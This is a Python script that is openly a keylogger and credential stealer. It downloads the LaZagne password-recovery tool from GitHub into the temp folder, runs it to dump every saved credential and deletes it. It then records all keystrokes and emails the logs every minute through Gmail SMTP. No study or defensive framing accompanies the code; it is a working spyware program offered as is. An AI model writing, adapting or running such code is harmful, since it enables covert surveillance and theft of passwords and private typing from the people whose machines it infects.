import pynput.keyboard
import threading
import sys
import requests
import smtplib
import subprocess
import os
import tempfile
import webbrowser
import pyautogui

url = 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe'


def download(url):
    tempdir = tempfile.gettempdir()
    os.chdir(tempdir)
    req = requests.get(url)
    filename = url.split('/')[-1]
    with open(filename, 'wb') as f:
        f.write(req.content)


def extract():
    command = 'laZagne.exe all'
    global message
    message = subprocess.check_output(command, shell=True)
    os.remove('laZagne.exe')


class Keylogger:
    def __init__(self, interval, email, password):
        self.log = 'Started'
        self.interval = interval
        self.email = email
        self.password = password

    def add_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            logged_key = str(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                logged_key = ' '
            elif str(key) == 'Key.backspace':
                logged_key = ' <--(Deleted something)'
            else:
                logged_key = " " + str(key) + " "
        self.add_log(logged_key)

    def send_logs(self):
        self.configure_email(self.email, self.password, self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.send_logs)
        timer.start()

    def configure_email(self, email, password, message):
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.on_press)
        with listener:
            self.send_logs()
            listener.join()


if __name__ == "__main__":
    try:
        # Passe as credenciais de e-mail e senha aqui
        email = 'your_email@gmail.com'
        password = 'your_password'
        
        download(url)
        extract()
        keylogger = Keylogger(60, email, password)
        keylogger.start()
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit()
